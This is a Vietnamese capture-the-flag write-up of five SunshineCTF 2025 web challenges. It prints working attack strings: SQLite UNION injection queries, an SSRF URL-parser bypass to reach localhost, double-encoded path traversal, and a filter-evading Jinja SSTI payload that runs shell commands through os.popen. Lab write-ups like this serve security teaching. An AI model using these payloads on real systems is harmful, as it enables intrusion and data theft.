# SunshineCTF2025

## Danh sách bài
- [Web - Lunar Auth](#web---lunar-auth)
- [Web - Lunar Shop](#web---lunar-shop)
- [Web - Intergalactic Webhook Service](#web---intergalactic-webhook-service)
- [Web - Lunar File Invasion](#web---lunar-file-invasion)
- [Web - Forge](#web---web-forge)

## Web - Lunar Auth

Mô tả của challege:
```
Infiltrate the LunarAuth admin panel and gain access to the super secret FLAG artifact !
```

Tôi thử kiểm tra xem có tệp `/robots.txt` không. Kết quả trả về:
```
# tired of these annoying search engine bots scraping the admin panel page logins:

Disallow: /admin
```

Truy cập vào endpoint `/admin` ta thấy một trang login. Kiểm tra src code html ta thấy một đoạn js quan trọng:
```js
const real_username = atob("YWxpbXVoYW1tYWRzZWN1cmVk");
const real_passwd   = atob("UzNjdXI0X1BAJCR3MFJEIQ==");
```
Trông chúng có vẻ giống encode-base64 giờ ta thử decode thu được u`sername: alimuhammadsecured` và `passwd: S3cur4_P@$$w0RD!`. Login thành công và thấy flag:

![alt text](image.png)

## Web - Lunar Shop

Mô tả của challege:
```
We have amazing new products for our gaming service! Unfortunately we don't sell our unreleased flag product yet !

Fuzzing is NOT allowed for this challenge, doing so will lead to IP rate limiting!
```

Nhấp vào một trong các sản phẩm tại `/products` sẽ đưa bạn đến một url như `https://meteor.sunshinectf.games/product?product_id=1`

Nhìn đoạn URL tôi thử test SQLi: `?product=1'` trang web trả về lỗi `[ Error occured. --> unrecognized token: "';" ]`. Dòng `unrecognized token` cho tôi biết trang web sử dụng `SQLite`. 

Tôi tiếp tục test: 
```
?product_id=1 or 1=1--
```

![alt text](image2.png)

```
?product_id=0 union select 1,2,3,4--
```
![alt text](image3.png)
Trang web trả về một kết quả duy nhất với 1, 2, 3 và 4 ở những vị trí mong đợi. Tiến hành dump `schema` của toàn bộ bảng trong `SQLite`
```
?product_id=0 union select sql,2,3,4 from sqlite_master where type='table'--
```
![alt text](image4.png)

Thấy được table `flag` có hai cột là `id` và `flag`, tiến hành đọc cột flag:
```
?product_id=0 union select flag,2,3,4 from flag--
```
![alt text](image5.png)

Thành công lấy được `flag`.

## Web - Intergalactic Webhook Service

Mô tả của challenge:
```
I got tired of creating webhooks from online sites, so I made my own webhook service! It even works in outer space! Be sure to check it out and let me know what you think. I'm sure it is the most secure webhook service in the universe.
```

Vì challenge cho src nên tôi sẽ liệt kê một số phần liên quan: 
```python
class FlagHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/flag':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(FLAG.encode())
        else:
            self.send_response(404)
            self.end_headers()

threading.Thread(target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(), daemon=True).start()
```

Phần này cho chúng ta biết rằng chúng ta có thể lấy flag bằng yêu cầu POST tới `http://127.0.0.1:5001/flag`. 

Có 2 endpoint liên quan: /register (đăng webhook) và /trigger (gọi webhook đã đăng). Cả hai đều gọi hàm is_ip_allowed(url) để chặn URL trỏ tới địa chỉ nội bộ.

Khi xem mã nguồn cho `/trigger`, tôi thấy mã bên dưới gửi POST request đến địa chỉ được chỉ định bởi webhook miễn là nó vượt qua các kiểm tra trong `is_ip_allowed(url)`.

Hàm kiểm tra `is_ip_allowed`
```python
def is_ip_allowed(url):
    parsed = urlparse(url)
    host = parsed.hostname or ''
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return False, f'Could not resolve host'
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
        return False, f'IP "{ip}" not allowed'
    return True, None
```

- Lấy host từ URL bằng urllib.parse.urlparse.
- Resolve ra IP thật bằng socket.gethostbyname.
- Nếu IP nằm trong các dải nội bộ (127.0.0.1, 10.x, 192.168.x.x, …) → từ chối.

#### Điểm yếu
Hàm kiểm tra `is_ip_allowed` và hàm gửi `requests.post` không dùng cùng một parser URL.

    is_ip_allowed → urllib.parse.urlparse
    requests.post(url, ...) → urllib3 bên trong Requests

Nếu 2 parser hiểu URL khác nhau → parser differential (mỗi thằng nghĩ host là khác nhau). Đây chính là chỗ để bypass.

```python
def is_ip_allowed(url):
    parsed = urlparse(url)       # <-- đây dùng urllib.parse.urlparse
    host = parsed.hostname or '' # <-- hostname từ urlparse dùng để resolve
    try:
        ip = socket.gethostbyname(host)
    ...
```

```python
def trigger_webhook():
    ...
    try:
        resp = requests.post(url, timeout=5, allow_redirects=False)   # <-- đây dùng urllib3 bên trong Requests
    ...    
```

#### Ví dụ: `http://1.1.1.1&@2.2.2.2#@3.3.3.3/`
- `urllib2 / httplib` (cũ): nghĩ host là `1.1.1.1`
- `requests`: nghĩ host là `2.2.2.2`
- `urllib`: nghĩ host là `3.3.3.3`

#### Payload: `http://127.0.0.1:5001\@8.8.8.8/../flag`
- `urllib.parse` coi phần trước và sau `\@` là một `netloc` chung nhưng `hostname` cuối cùng được trả là phần sau (ở payload là 8.8.8.8).

- `urllib3` coi `\@` như escape/ký tự đặc biệt không phân tách `userinfo`, và nhận host thực là 127.0.0.1 với port 5001.

### Lấy flag:
![alt text](image1.png)

## Web - Lunar File Invasion

Mô tả của challenge:
```
We recently started a new CMS, we've had issues with random bots scraping our pages but found a solution with robots! Anyways, besides that there are no new bug fixes. Enjoy our product!

Fuzzing is NOT allowed for this challenge, doing so will lead to IP rate limiting!

https://asteroid.sunshinectf.games
```
## Solution

Tôi thử kiểm tra xem có tệp `/robots.txt` không. Kết quả trả về:
```
# don't need web scrapers scraping these sensitive files:
Disallow: /.gitignore_test
Disallow: /login
Disallow: /admin/dashboard
Disallow: /2FA
```

Thử truy cập vào `/.gitignore_test`:

```
# this tells the git CLI to ignore these files so they're not pushed to the repos by mistake.
# this is because Muhammad noticed there were temporary files being stored on the disk when being edited
# something about EMACs.

# From MUHAMMAD: please make sure to name this .gitignore or it will not work !!!!

# static files are stored in the /static directory.
/index/static/login.html~
/index/static/index.html~
/index/static/error.html~
```

Thử truy cập vào cả 3 `/static directory` trên thì `/index/static/login.html~` trả về nội dung quan trọng:
```html
<input value="admin@lunarfiles.muhammadali" type="text" name="email">
<input value="jEJ&(32)DMC<!*###" type="text" name="password">
```

Truy cập vào `/login`, dùng email và password trong file HTML để đăng nhập. Khi đăng nhập thành công trang web đưa ta đến `2FA page`:

![alt text](image-6.png)

Thử truy cập vào `/admin/dashboard` ta đã bypass được 2FA và đến trang `Lunar File Management CMS`

![alt text](image-1.png)

Truy cập `Manage Files` ta thấy có 3 flie secret file txt. 

Nội dung `secret2.txt`:
```
From Muhammad:
so we triggered IR, one of the attackers somehow got their hands on our /etc/passwd file because it's on every Linux machine.

I did some research and a lot of the techniques they did were from Hacktricks website! :(((
```

Lúc này ta nghĩ ngay đến path traversal. Kiểm tra src của `/admin/lunar_shop`, ta tìm thấy một điểm quan trọng: 
```js
function fetchFileContent(filename) {
// no need ot URLEncode this is JS argument being pssed in,
// plug we already URLencoded via flask's | urlencode
const viewUrl = `/admin/download/${filename}`;
...
}
```

Thử tìm `app.py` với `https://asteroid.sunshinectf.games/admin/download/app.py` trang web trả về `302 Found`, tương tự `run.py` và `yourappenv` cũng vậy.

Thử thao tác đường dẫn bằng cách thêm dấu / để truy cập vào kiến ​​trúc bên trong với
`https://asteroid.sunshinectf.games/admin/download//app.py`:
```html
<p>You should be redirected automatically to the target URL: <a href="http://127.0.0.1:25307/admin/download/app.py">http://127.0.0.1:25307/admin/download/app.py</a>
```

Ta thấy chúng đang chạy trên cổng 25307.

Thử Path Traversal bằng urlencode (single-encoded %2f) để tìm app.py
```
https://asteroid.sunshinectf.games/admin/download/..%2f..%2f..%2fapp.py
```
Nó trả về `400 Bad Request` điều này chỉ ra trang web có blacklist of characters trong path traversal. Thử double-encode %252f:

![alt text](image-3.png)

Tăng mức độ taversal nhiều lần kết quả vẫn như vậy. Giờ hãy thử sử dụng relative path `./` thay vì urlencoded thành `.%252f` và thu được kết quả:

![alt text](image-4.png)

Nội dung `app.py`:
```python
import os

with open("./FLAG/flag.txt", "r") as f:
    FLAG = f.read()

from flask import *
from flask_login import (
    LoginManager,
    login_user,
    login_required,
    logout_user,
    current_user,
)
from flask_wtf.csrf import CSRFError

# blueprint stuff:
from models import *
from admin import admin_blueprint
from index import index_blueprint
# ^^ this is what I meant by:
# "the dir is"
# treated as a package in a sense.

# global
from extensions import *


# clean up the login page and make it functional then we can start piecing together the LFI dashboard
# functionality too

# Initializing the app-specific stuff:
app = Flask(__name__)

# registering the blueprint
app.register_blueprint(admin_blueprint, url_prefix="/admin")
app.register_blueprint(index_blueprint, url_prefix="/")
# app.static_folder = 'global_static'

app.config["SECRET_KEY"] = os.urandom(64).hex()
bcrypt_object.init_app(app)

# since we're directly pass in the app object we can directly use it in our templates with JINJA2 syntax
csrf.init_app(app)

# I know for a fact ppl will try to bruteforce the pin which is millions of requests,
# we're stopping that before it begins with the default rate-limit being set to 5 requests/second.

# TODO: remove this, just use NGINX, kills 2 birds with 1 stone bcs we can also config passwd for kev's test instance.

# Initialize Flask-Login
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = (
    "index.login"  # Redirect to admin login page if not logged in
)
# the way this works is it checks if current_user.is_authenticated is set to True, this value is retrieved from
# the load_user() function (so it's called everytime implicitly on routes that have the @login_required() decorator


@login_manager.user_loader
def load_user(user_id):
    return session.query(User).get(user_id)


################################################################


# Wrapper for Error handling any invalid CSRF tokens.
@app.errorhandler(CSRFError)
def handle_csrf_error(error):
    return render_template(
        "error.html",
        err_msg=f"[ Invalid CSRF Token, if this persists please enable JavaScript. ]",
    ), 400


################################################################
def create_app():
    return app


if __name__ == "__main__":
    app = create_app()
    app.run(host="0.0.0.0", port=8000, debug=False)
```

Tuyệt, ta tìm được cờ nằm ở `/FLAG/flag.txt`. Vì vậy thay `app.py` thành `/FLAG/flag.txt`: 

![alt text](image-5.png)

Thành công tìm được flag.

## Web - Web Forge

Mô tả của challenge:
```
NOTE FROM ADMINS: Use of automated fuzzing tools are allowed for this challenge. Fuzzing. Not Crawling. All endpoints aside from one are rate limited.
```


Truy cập vào `/admin`:
```
403 Forbidden: missing or incorrect SSRF access header
```

Tôi thử kiểm tra xem có tệp `/robots.txt` không. Kết quả trả về:
```
User-agent: *
Disallow: /admin
Disallow: /fetch

# internal SSRF testing tool requires special auth header to be set to 'true'
```

Nội dung này cho ta thấy cần một header được set là `true`

Truy cập trực tiếp vào `/admin`: **Forbidden — permission required**. Giờ chúng ta hãy **Fuzzing the SSRF access header**. 
Danh sách header lấy [tại đây](https://github.com/danielmiessler/SecLists/blob/f2d366a237436a904df19d19ca5545b9942bcabc/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers):

![alt text](image6.png)

Dẹt sơ, ta đã tìm được header: `Allow: true`. Sau đó, chúng ta có thể truy cập `/fetch`. Nó có biểu mẫu cho ssrf:

![alt text](image7.png)

Nhập thử url: `http://127.0.0.1/admin`

![alt text](image8.png)

Trang web ngay lập tức phàn nàn rằng tôi đã quên tham số `?template=parameter`. Tiếp tục fetch url với tham số `tempalte`:

![alt text](image9.png)

Vậy là trang web báo tôi đã sai port. Vì vậy tôi sẽ burteforce các port phổ biến: `http://127.0.0.1:<port>/admin?template=test` và thu được kết quả hợp lệ là port 8000.

![alt text](image10.png)

Lúc này tôi nghĩ ngay đến lỗi Template Rendering SSTI và thử một payload đơn giản `{{7*7}}`. Kết quả trả ngay về 49 -> SSTI:

![alt text](image11.png)

Hãy thử tải trọng tiêm Jinja thông thường từ [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md), cho đến khi chúng ta thấy server filter `.` hoặc `_`. Tuy nhiên ta có thể thực thi payload sau để bypass `.`, `_`:
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
![alt text](image12.png)

Tiếp theo ta ls để tìm xem flag nằm ở đâu và đọc nó:

![alt text](image13.png)

Thành công đọc được flag.

